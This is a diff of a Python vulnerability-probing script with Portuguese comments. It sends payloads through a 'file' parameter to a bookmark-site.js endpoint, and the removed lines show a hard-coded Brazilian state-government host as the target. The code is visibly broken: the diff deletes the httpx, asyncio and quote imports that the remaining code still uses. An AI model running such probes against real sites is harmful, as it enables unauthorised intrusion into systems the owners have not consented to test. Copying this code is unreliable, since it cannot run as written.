@@ -1,10 +1,17 @@
-import httpx
-import asyncio
-from urllib.parse import quote
+import requests
 from bs4 import BeautifulSoup
+import sys
+import os
 
-# Configurações iniciais
-url_base = "https://sone.codatahml.pb.gov.br/javascript/bookmark-site.js"
+if len(sys.argv) > 1:
+    url_base = sys.argv[1]  # Recebe a URL base como argumento do código principal
+else:
+    print("URL base não foi fornecida.")
+    sys.exit(1)
+
+url_alvo = f"{url_base}/javascript/bookmark-site.js"
+print(url_alvo)
+
 headers_base = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
 }
@@ -19,7 +26,7 @@ payloads = {
 
 # Função assíncrona para enviar a requisição e verificar a resposta
 async def enviar_requisicao_e_verificar_resposta(payload, tipo_vulnerabilidade, teste_numero):
-    url_completa = f"{url_base}&file={quote(payload)}"
+    url_completa = f"{url_alvo}&file={quote(payload)}"
     async with httpx.AsyncClient() as client:  # HTTP/2 desabilitado
         resposta_teste = await client.get(url_completa)  # Cabeçalhos simplificados
         
@@ -64,6 +71,7 @@ async def executar_testes():
     print(f"\nTotal de Testes: {total_testes}")
     print(f"Testes Passaram: {testes_passaram}")
     print(f"Testes Falharam: {testes_falharam}")
+    print(f"Url Testada: {url_alvo}") #Depurar e informar a url final que foi alvo
 
 # Executar os testes
 if __name__ == "__main__":
